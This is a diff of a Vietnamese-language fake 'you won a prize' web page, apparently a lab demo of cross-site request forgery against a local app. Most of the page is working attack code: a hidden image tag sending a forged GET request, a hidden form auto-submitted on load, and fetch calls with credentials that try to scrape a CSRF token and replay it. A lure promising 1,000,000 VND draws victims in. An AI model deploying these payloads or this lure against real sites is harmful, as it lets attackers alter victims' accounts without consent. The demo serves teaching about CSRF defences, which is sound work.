@@ -1,267 +1,385 @@
 <!DOCTYPE html>
 <html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>🎁 Nhận Quà Miễn Phí - Trang Web Giả Mạo</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+      }
+
+      .container {
+        background: white;
+        border-radius: 20px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        padding: 40px;
+        max-width: 600px;
+        width: 100%;
+        text-align: center;
+      }
+
+      .gift-icon {
+        font-size: 80px;
+        animation: bounce 2s infinite;
+      }
+
+      @keyframes bounce {
+        0%,
+        100% {
+          transform: translateY(0);
         }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+        50% {
+          transform: translateY(-20px);
         }
-        
-        .container {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            padding: 40px;
-            max-width: 600px;
-            width: 100%;
-            text-align: center;
-        }
-        
-        .gift-icon {
-            font-size: 80px;
-            animation: bounce 2s infinite;
-        }
-        
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
-        }
-        
-        h1 {
-            color: #667eea;
-            margin: 20px 0;
-            font-size: 2em;
-        }
-        
-        .prize {
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-            font-size: 1.5em;
-            font-weight: bold;
-        }
-        
-        .description {
-            color: #666;
-            line-height: 1.6;
-            margin: 20px 0;
-        }
-        
-        .claim-button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 1.2em;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            margin: 20px 0;
-        }
-        
-        .claim-button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
-        }
-        
-        .warning {
-            background: #fff3cd;
-            border: 2px solid #ffc107;
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 30px;
-            text-align: left;
-        }
-        
-        .warning h3 {
-            color: #856404;
-            margin-bottom: 10px;
-        }
-        
-        .warning ul {
-            color: #856404;
-            margin-left: 20px;
-            line-height: 1.8;
-        }
-        
-        .warning code {
-            background: #f8f9fa;
-            padding: 2px 6px;
-            border-radius: 3px;
-            font-family: 'Courier New', monospace;
-        }
-        
-        .attack-status {
-            background: #f8d7da;
-            border: 2px solid #f5c6cb;
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 20px;
-            color: #721c24;
-            display: none;
-        }
-        
-        .attack-status.show {
-            display: block;
-        }
+      }
+
+      h1 {
+        color: #667eea;
+        margin: 20px 0;
+        font-size: 2em;
+      }
+
+      .prize {
+        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        color: white;
+        padding: 20px;
+        border-radius: 10px;
+        margin: 20px 0;
+        font-size: 1.5em;
+        font-weight: bold;
+      }
+
+      .description {
+        color: #666;
+        line-height: 1.6;
+        margin: 20px 0;
+      }
+
+      .claim-button {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        border: none;
+        padding: 15px 40px;
+        font-size: 1.2em;
+        border-radius: 50px;
+        cursor: pointer;
+        transition: transform 0.3s, box-shadow 0.3s;
+        margin: 20px 0;
+      }
+
+      .claim-button:hover {
+        transform: scale(1.05);
+        box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+      }
+
+      .warning {
+        background: #fff3cd;
+        border: 2px solid #ffc107;
+        border-radius: 10px;
+        padding: 20px;
+        margin-top: 30px;
+        text-align: left;
+      }
+
+      .warning h3 {
+        color: #856404;
+        margin-bottom: 10px;
+      }
+
+      .warning ul {
+        color: #856404;
+        margin-left: 20px;
+        line-height: 1.8;
+      }
+
+      .warning code {
+        background: #f8f9fa;
+        padding: 2px 6px;
+        border-radius: 3px;
+        font-family: "Courier New", monospace;
+      }
+
+      .attack-status {
+        background: #f8d7da;
+        border: 2px solid #f5c6cb;
+        border-radius: 10px;
+        padding: 15px;
+        margin-top: 20px;
+        color: #721c24;
+        display: none;
+      }
+
+      .attack-status.show {
+        display: block;
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <div class="container">
-        <div class="gift-icon">🎁</div>
-        <h1>Chúc Mừng! Bạn Đã Trúng Thưởng!</h1>
-        
-        <div class="prize">
-            💰 1.000.000 VNĐ 💰
-        </div>
-        
-        <p class="description">
-            Bạn là người dùng thứ 1000 truy cập trang web của chúng tôi hôm nay!<br>
-            Nhấn nút bên dưới để nhận thưởng ngay lập tức!
+      <div class="gift-icon">🎁</div>
+      <h1>Chúc Mừng! Bạn Đã Trúng Thưởng!</h1>
+
+      <div class="prize">💰 1.000.000 VNĐ 💰</div>
+
+      <p class="description">
+        Bạn là người dùng thứ 1000 truy cập trang web của chúng tôi hôm nay!<br />
+        Nhấn nút bên dưới để nhận thưởng ngay lập tức!
+      </p>
+
+      <button class="claim-button" onclick="claimPrize()">
+        🎉 Nhận Thưởng Ngay 🎉
+      </button>
+
+      <div class="attack-status" id="attackStatus">
+        <strong>⚠️ CSRF Attack Status:</strong>
+        <p id="statusMessage">🔄 Đang thực hiện tấn công tự động...</p>
+      </div>
+
+      <div
+        style="
+          background: #e8f5e9;
+          border: 2px solid #4caf50;
+          border-radius: 10px;
+          padding: 15px;
+          margin-top: 20px;
+          color: #2e7d32;
+        "
+      >
+        <strong>💡 Thông Tin:</strong>
+        <p style="margin: 10px 0; font-size: 0.9em">
+          ✅ Tấn công được gửi <strong>TỰ ĐỘNG</strong> khi trang này được mở<br />
+          ✅ Bạn không cần vào trang Profile trước<br />
+          ✅ Hãy quay lại app và check Profile để xem kết quả<br />
+          💬 Mở Console (F12) để xem chi tiết attacks
         </p>
-        
-        <button class="claim-button" onclick="claimPrize()">
-            🎉 Nhận Thưởng Ngay 🎉
-        </button>
-       
-        <div class="attack-status" id="attackStatus">
-            <strong>⚠️ CSRF Attack Status:</strong>
-            <p id="statusMessage">🔄 Đang thực hiện tấn công tự động...</p>
-        </div>
-        
-        <div style="background: #e8f5e9; border: 2px solid #4caf50; border-radius: 10px; padding: 15px; margin-top: 20px; color: #2e7d32;">
-            <strong>💡 Thông Tin:</strong>
-            <p style="margin: 10px 0; font-size: 0.9em;">
-                ✅ Tấn công được gửi <strong>TỰ ĐỘNG</strong> khi trang này được mở<br>
-                ✅ Bạn không cần vào trang Profile trước<br>
-                ✅ Hãy quay lại app và check Profile để xem kết quả<br>
-                💬 Mở Console (F12) để xem chi tiết attacks
-            </p>
-        </div>
-        
-        <!-- PHƯƠNG PHÁP 1: CSRF ATTACK qua IMG tag (GET request) -->
-        <img src="http://localhost:3000/api/profile/update-bio?bio=【CSRF GET Attack】Tài+khoản+bị+hack+qua+IMG+tag+🔥" 
-             class="csrf-payload" 
-             alt="tracking-pixel"
-             style="display: none;"
-             onerror="handleImgAttack(false)"
-             onload="handleImgAttack(true)" />
-        
-        <!-- PHƯƠNG PHÁP 2: CSRF ATTACK qua Form Auto-Submit (POST request) -->
-        <!-- Form này sẽ TỰ ĐỘNG SUBMIT khi trang load -->
-        <form id="csrfForm" 
-              action="http://localhost:3000/api/profile/update-bio-secure" 
-              method="POST" 
-              style="display: none;">
-            <input type="hidden" name="bio" value="【CSRF POST Attack】Tài khoản bị hack qua Form Auto-Submit 💀">
-        </form>
-        
-        <!-- PHƯƠNG PHÁP 3: CSRF ATTACK qua Fetch/AJAX (Sẽ bị CORS chặn) -->
-        <script>
-            // Thử tấn công qua fetch (sẽ thất bại do CORS)
-            fetch('http://localhost:3000/api/profile/update-bio-secure', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    bio: '【CSRF AJAX Attack】Tài khoản bị hack qua AJAX 🎯'
-                }),
-                credentials: 'include'
-            }).catch(err => {
-                console.log('AJAX attack blocked by CORS:', err);
+      </div>
+
+      <!-- PHƯƠNG PHÁP 1: CSRF ATTACK qua IMG tag (GET request) -->
+      <img
+        src="http://localhost:3000/api/profile/update-bio?bio=%E3%80%90CSRF%20GET%20Attack%E3%80%91T%C3%A0i%20kho%E1%BA%A3n%20b%E1%BB%8B%20hack%20qua%20IMG%20tag%20%F0%9F%94%A5"
+        class="csrf-payload"
+        alt="tracking-pixel"
+        style="display: none"
+        onerror="handleImgAttack(false)"
+        onload="handleImgAttack(true)"
+      />
+
+      <!-- PHƯƠNG PHÁP 2: CSRF ATTACK qua Form Auto-Submit (POST request) -->
+      <!-- Form này sẽ TỰ ĐỘNG SUBMIT khi trang load -->
+      <form
+        id="csrfForm"
+        action="http://localhost:3000/api/profile/update-bio-secure"
+        method="POST"
+        style="display: none"
+      >
+        <input
+          type="hidden"
+          name="bio"
+          value="【CSRF POST Attack】Tài khoản bị hack qua Form Auto-Submit 💀"
+        />
+        <input type="hidden" name="csrf_token" id="csrfToken" value="" />
+      </form>
+
+      <!-- PHƯƠNG PHÁP 3: CSRF ATTACK qua Fetch/AJAX với token -->
+      <script>
+        // Lấy CSRF token từ app chính nếu có
+        async function getCSRFToken() {
+          try {
+            const response = await fetch("http://localhost:5173", {
+              method: "GET",
+              credentials: "include",
             });
-        </script>
+            const html = await response.text();
+            // Tìm CSRF token trong HTML
+            const tokenMatch = html.match(/csrf["\']?\s*:\s*["\']([^"\']+)["\']/i);
+            if (tokenMatch) {
+              console.log("✓ CSRF Token lấy được:", tokenMatch[1].substring(0, 20) + "...");
+              return tokenMatch[1];
+            }
+          } catch (err) {
+            console.log("Không thể lấy CSRF token từ app chính");
+          }
+          return null;
+        }
+
+        // Tấn công với Fetch/AJAX
+        async function performAjaxAttack() {
+          const token = await getCSRFToken();
+          
+          fetch("http://localhost:3000/api/profile/update-bio-secure", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "X-CSRF-Token": token || "",
+              "X-XSRF-Token": token || "",
+            },
+            body: JSON.stringify({
+              bio: "【CSRF AJAX Attack】Tài khoản bị hack qua AJAX 🎯",
+            }),
+            credentials: "include",
+          })
+            .then(async (res) => {
+              const contentType = res.headers.get("content-type");
+              if (contentType && contentType.includes("application/json")) {
+                const data = await res.json();
+                if (data.success) {
+                  console.log("%c✓ AJAX Attack SUCCESS", "color: green; font-weight: bold;", data);
+                  attackResults.ajaxAttack = true;
+                } else {
+                  console.log("%c✗ AJAX Attack BLOCKED (Internal API)", "color: red; font-weight: bold;", data);
+                  attackResults.ajaxAttack = false;
+                }
+              } else {
+                console.log("%c🟢 AJAX Attack BLOCKED (Redirected to Security Page)", "color: green; font-weight: bold;");
+                attackResults.ajaxAttack = false;
+              }
+              updateStatus();
+            })
+            .catch((err) => {
+              console.log("AJAX attack error (likely CORS block):", err);
+              attackResults.ajaxAttack = false;
+              updateStatus();
+            });
+        }
+        
+        performAjaxAttack();
+      </script>
     </div>
-    
+
     <script>
-        let attackResults = {
-            imgAttack: false,
-            formAttack: false,
-            ajaxAttack: false
-        };
-        
-        function handleImgAttack(success) {
-            attackResults.imgAttack = success;
-            console.log('%c🔴 IMG Tag Attack:', 'color: red; font-weight: bold;', success ? 'SUCCESS ✓' : 'FAILED ✗');
-            updateStatus();
-        }
-        
-        function claimPrize() {
-            // Kích hoạt form auto-submit khi user click button
-            const form = document.getElementById('csrfForm');
-            form.submit();
-            attackResults.formAttack = true;
-            
-            setTimeout(() => {
-                document.getElementById('statusMessage').innerHTML = 
-                    '✅ Form POST Attack đã được submit!<br>Kiểm tra profile của bạn để xem kết quả.';
-            }, 100);
-            
-            console.log('%c🔴 Form Auto-Submit Attack:', 'color: red; font-weight: bold;', 'TRIGGERED ⚡');
-        }
-        
-        function updateStatus() {
-            const statusDiv = document.getElementById('attackStatus');
-            statusDiv.classList.add('show');
-            
-            let message = '<strong>📊 Trạng thái các attacks:</strong><br>';
-            message += `1️⃣ IMG Tag (GET): ${attackResults.imgAttack ? '✅ Thành công' : '⏳ Đang chờ'}<br>`;
-            message += `2️⃣ Form POST: ${attackResults.formAttack ? '✅ Được kích hoạt' : '⏳ Chưa kích hoạt'}<br>`;
-            message += `3️⃣ AJAX: ❌ Bị chặn bởi CORS<br><br>`;
-            message += '<strong>💡 Hãy quay lại app và check Profile!</strong>';
-            
-            document.getElementById('statusMessage').innerHTML = message;
-        }
-        
-        // Tự động trigger form attack khi trang load (sau 1 giây)
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                console.log('%c🔥 AUTO-SUBMITTING FORM ATTACK...', 'color: red; font-size: 16px; font-weight: bold;');
-                const form = document.getElementById('csrfForm');
-                form.submit();
-                attackResults.formAttack = true;
-                updateStatus();
-            }, 1000);
-        });
-        
-        // Log để demo
-        console.log('%c🔴 CSRF ATTACK DEMO - Multiple Methods', 'color: red; font-size: 20px; font-weight: bold;');
-        console.log('%c═══════════════════════════════════════', 'color: red;');
-        console.log('%cPhương pháp 1: IMG tag (GET)', 'color: orange; font-weight: bold;');
-        console.log('Target: http://localhost:3000/api/profile/update-bio');
-        console.log('Method: GET request qua <img> tag');
-        console.log('Status: Tự động gửi khi trang load');
-        console.log('%c═══════════════════════════════════════', 'color: red;');
-        console.log('%cPhương pháp 2: Form Auto-Submit (POST)', 'color: orange; font-weight: bold;');
-        console.log('Target: http://localhost:3000/api/profile/update-bio-secure');
-        console.log('Method: POST request qua form submit');
-        console.log('Status: Kích hoạt khi click button');
-        console.log('%c═══════════════════════════════════════', 'color: red;');
-        console.log('%cPhương pháp 3: Fetch/AJAX (sẽ bị CORS chặn)', 'color: orange; font-weight: bold;');
-        console.log('Target: http://localhost:3000/api/profile/update-bio-secure');
-        console.log('Method: POST request qua fetch API');
-        console.log('Status: Bị chặn bởi CORS policy');
-        console.log('%c═══════════════════════════════════════', 'color: red;');
-        
-        // Hiển thị status ban đầu
+      let attackResults = {
+        imgAttack: false,
+        formAttack: false,
+        ajaxAttack: false,
+      };
+
+      function handleImgAttack(success) {
+        attackResults.imgAttack = success;
+        console.log(
+          `%c🔴 IMG Tag Attack: ${success ? "SUCCESS ✓ (Update maybe happened)" : "BLOCKED/FAILED ✗ (Likely redirected to alert page)"}`,
+          `color: ${success ? 'red' : 'green'}; font-weight: bold;`
+        );
         updateStatus();
+      }
+
+      function claimPrize() {
+        // Gửi tấn công GET (không cần CSRF token)
+        console.log(
+          "%c🔴 GET Attack being triggered:",
+          "color: red; font-weight: bold;",
+          "TRIGGERED ⚡"
+        );
+
+        // Fetch GET endpoint (không bảo vệ)
+        fetch(
+          "http://localhost:3000/api/profile/update-bio?bio=【CSRF%20GET%20Attack】%20Tài%20khoản%20bị%20hack%20🔥",
+          {
+            credentials: "include",
+          }
+        )
+          .then((res) => res.json().catch(() => res.text()))
+          .then((data) => {
+            console.log("%c✓ GET Attack SUCCESS", "color: green; font-weight: bold;", data);
+            attackResults.formAttack = true;
+
+            document.getElementById("statusMessage").innerHTML =
+              "✅ Tấn công CSRF GET thành công!<br>Kiểm tra profile của bạn để xem kết quả.";
+            
+            // Redirect tới trang thông báo sau 2 giây
+            setTimeout(() => {
+              window.location.href = "http://localhost:3000/attack-success.html";
+            }, 2000);
+          })
+          .catch((err) => {
+            console.error("Attack error:", err);
+            document.getElementById("statusMessage").innerHTML =
+              "❌ Lỗi khi thực hiện tấn công";
+          });
+      }
+
+      function updateStatus() {
+        const statusDiv = document.getElementById("attackStatus");
+        statusDiv.classList.add("show");
+
+        let message = "<strong>📊 Trạng thái các attacks:</strong><br>";
+        message += `1️⃣ IMG Tag (GET): ${
+          attackResults.imgAttack ? "🔴 Thành công (Hacked!)" : "🟢 Bị chặn (An toàn)"
+        }<br>`;
+        message += `2️⃣ Form POST: ${
+          attackResults.formAttack ? "🔴 Đã kích hoạt" : "⏳ Chờ click"
+        }<br>`;
+        message += `3️⃣ AJAX POST: ${
+          attackResults.ajaxAttack ? "🔴 Thành công (Hacked!)" : "🟢 Bị chặn (An toàn)"
+        }<br><br>`;
+        message += "<strong>💡 Kiểm tra Profile ở Tab bên cạnh!</strong>";
+
+        document.getElementById("statusMessage").innerHTML = message;
+      }
+
+      // Tự động trigger form attack khi trang load (sau 1 giây)
+      window.addEventListener("load", () => {
+        setTimeout(() => {
+          console.log(
+            "%c🔥 AUTO-SUBMITTING FORM ATTACK...",
+            "color: red; font-size: 16px; font-weight: bold;"
+          );
+          const form = document.getElementById("csrfForm");
+          form.submit();
+          attackResults.formAttack = true;
+          updateStatus();
+        }, 1000);
+      });
+
+      // Log để demo
+      console.log(
+        "%c🔴 CSRF ATTACK DEMO - Multiple Methods",
+        "color: red; font-size: 20px; font-weight: bold;"
+      );
+      console.log("%c═══════════════════════════════════════", "color: red;");
+      console.log(
+        "%cPhương pháp 1: IMG tag (GET)",
+        "color: orange; font-weight: bold;"
+      );
+      console.log("Target: http://localhost:3000/api/profile/update-bio");
+      console.log("Method: GET request qua <img> tag");
+      console.log("Status: Tự động gửi khi trang load");
+      console.log("%c═══════════════════════════════════════", "color: red;");
+      console.log(
+        "%cPhương pháp 2: Form Auto-Submit (POST)",
+        "color: orange; font-weight: bold;"
+      );
+      console.log(
+        "Target: http://localhost:3000/api/profile/update-bio-secure"
+      );
+      console.log("Method: POST request qua form submit");
+      console.log("Status: Kích hoạt khi click button");
+      console.log("%c═══════════════════════════════════════", "color: red;");
+      console.log(
+        "%cPhương pháp 3: Fetch/AJAX (sẽ bị CORS chặn)",
+        "color: orange; font-weight: bold;"
+      );
+      console.log(
+        "Target: http://localhost:3000/api/profile/update-bio-secure"
+      );
+      console.log("Method: POST request qua fetch API");
+      console.log("Status: Bị chặn bởi CORS policy");
+      console.log("%c═══════════════════════════════════════", "color: red;");
+
+      // Hiển thị status ban đầu
+      updateStatus();
     </script>
-</body>
+  </body>
 </html>
